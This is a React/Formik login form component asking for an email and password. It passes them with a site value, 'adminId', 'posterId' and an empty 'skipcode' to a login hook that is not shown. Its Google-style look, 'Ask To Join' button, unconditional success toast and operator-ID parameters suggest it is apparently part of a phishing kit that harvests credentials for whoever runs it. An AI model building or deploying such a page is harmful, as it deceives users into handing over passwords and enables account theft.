import { Field, Form, Formik } from "formik";
import useMockLogin from "../hooks/useMockLogin";
import { site } from "../config";
import { toast } from "react-toastify";

function LoginForm({ adminId, posterId }) {
  const initialvalues = {
    email: "",
    password: "",
    remember: "",
  };

  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    // console.log("values", values);
    // return;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    login(submitValues, formik);
    toast.success("Login Succecssfull");

    // console.log(submitValues);
  };

  return (
    <div className="px-5 lg:px-10 mt-5  md:w-[420px] bg-white w-[400px]">
      <p className="text-2xl  text-gray-600 text-center ">What's your Email?</p>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-300 shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
                placeholder="Your email"
                name="email"
                type="email"
                required
              />

              <Field
                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-300  shadow-inner placeholder:font-medium placeholder:text-black/50 focus:border-[#1a73e8] rounded "
                placeholder="Password"
                name="password"
                type="password"
                autoComplete="on"
                required
              />

              <button
                type="submit"
                className="mt-5 w-full text-lg font-bold bg-[#1a73e8]  py-[10px] text-white transition duration-300 rounded-full"
              >
                Ask To Join
              </button>
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
